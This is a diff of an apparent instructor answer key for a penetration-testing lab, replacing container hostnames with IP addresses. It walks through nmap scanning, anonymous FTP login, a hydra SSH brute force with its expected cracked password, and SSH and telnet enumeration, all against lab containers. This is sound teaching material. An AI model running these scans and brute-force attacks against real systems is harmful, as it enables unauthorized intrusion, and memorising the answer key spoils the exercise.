@@ -20,37 +20,48 @@ nmap -sn 172.20.0.0/24
 ```
 Nmap scan report for 172.20.0.1
 Host is up (0.000011s latency).
-Nmap scan report for de-ice-attacker.worksheet_lab_network (172.20.0.2)
+Nmap scan report for 172.20.0.2 (attacker)
 Host is up (0.000011s latency).
-Nmap scan report for target-web.worksheet_lab_network (172.20.0.3)
+Nmap scan report for 172.20.0.3
 Host is up (0.000011s latency).
-Nmap scan report for target-ssh.worksheet_lab_network (172.20.0.4)
+Nmap scan report for 172.20.0.4  
 Host is up (0.000011s latency).
-Nmap scan report for target-ftp.worksheet_lab_network (172.20.0.5)
+Nmap scan report for 172.20.0.5
 Host is up (0.000011s latency).
-Nmap scan report for target-smtp.worksheet_lab_network (172.20.0.6)
+Nmap scan report for 172.20.0.6
 Host is up (0.000011s latency).
-Nmap scan report for target-mail.worksheet_lab_network (172.20.0.7)
+Nmap scan report for 172.20.0.7
 Host is up (0.000011s latency).
 ```
+
+**Target IPs Discovered:**
+- 172.20.0.3 - Web server
+- 172.20.0.4 - SSH server  
+- 172.20.0.5 - FTP server
+- 172.20.0.6 - SMTP server
+- 172.20.0.7 - Mail server
 
 ## Phase 1: Reconnaissance (Expected Student Results)
 
-### Network Discovery
+### Network Discovery and Port Scanning
 ```bash
-nmap -sC -sV target-web target-ssh target-ftp target-smtp target-mail
+# Step 1: Network discovery 
+nmap -sn 172.20.0.0/24
+
+# Step 2: Port scan discovered targets
+nmap -sC -sV 172.20.0.3 172.20.0.4 172.20.0.5 172.20.0.6 172.20.0.7
 ```
 
 **Expected Ports Discovered:**
-- target-web: 80/tcp (HTTP)
-- target-ssh: 2222/tcp (SSH)
-- target-ftp: 21/tcp (FTP), 20/tcp (FTP-data)
-- target-smtp: 1025/tcp (SMTP), 8025/tcp (HTTP)
-- target-mail: 110/tcp (POP3), 143/tcp (IMAP)
+- 172.20.0.3: 80/tcp (HTTP - Apache)
+- 172.20.0.4: 2222/tcp (SSH - OpenSSH)
+- 172.20.0.5: 21/tcp (FTP - vsftpd), 20/tcp (FTP-data)
+- 172.20.0.6: 1025/tcp (SMTP - MailHog), 8025/tcp (HTTP - MailHog Web UI)
+- 172.20.0.7: 110/tcp (POP3 - Dovecot), 143/tcp (IMAP - Dovecot)
 
 ### Web Enumeration
 ```bash
-curl http://target-web
+curl http://172.20.0.3
 ```
 
 **Expected Findings:**
@@ -65,7 +76,7 @@ Students should extract these employee names and emails:
 
 ### FTP Service Investigation
 ```bash
-ftp target-ftp
+ftp 172.20.0.5
 # Username: anonymous
 # Password: anonymous (or just press Enter)
 
@@ -81,7 +92,7 @@ ftp> quit
 
 ### SSH Service Banner
 ```bash
-ssh -p 2222 target-ssh
+ssh -p 2222 172.20.0.4
 ```
 
 **Expected Banner:** OpenSSH server accepting password authentication
@@ -119,17 +130,17 @@ EOF
 
 ### SSH Brute Force Attack
 ```bash
-hydra -L users.txt -P passwords.txt target-ssh ssh -s 2222 -t 4
+hydra -L users.txt -P passwords.txt 172.20.0.4 ssh -s 2222 -t 4
 ```
 
 **Expected Successful Credential:**
 ```
-[2222][ssh] host: target-ssh   login: aadams   password: nostaw
+[2222][ssh] host: 172.20.0.4   login: aadams   password: nostaw
 ```
 
 ### SSH Access and Exploration
 ```bash
-ssh -p 2222 aadams@target-ssh
+ssh -p 2222 aadams@172.20.0.4
 # Password: nostaw
 
 # Once inside:
@@ -180,24 +191,24 @@ Students should notice that `nostaw` is `watson` backwards, suggesting:
 ### Additional Service Enumeration
 ```bash
 # SMTP Banner
-telnet target-smtp 1025
+telnet 172.20.0.6 1025
 # Type: EHLO test
 # Expected: MailHog SMTP server response
 
 # POP3 Banner  
-telnet target-mail 110
+telnet 172.20.0.7 110
 # Expected: Dovecot POP3 server ready
 
 # IMAP Banner
-telnet target-mail 143  
+telnet 172.20.0.7 143  
 # Expected: Dovecot IMAP server ready
 ```
 
 ## Common Student Errors & Troubleshooting
 
 ### Error: "Connection Refused"
-**Cause:** Student using wrong hostname/port
-**Solution:** Ensure using container names (target-web, target-ssh, etc.) and correct ports
+**Cause:** Student using wrong IP address/port
+**Solution:** Ensure using correct IP addresses discovered from network scan and correct ports
 
 ### Error: "Host not found"
 **Cause:** Student not in attacker container
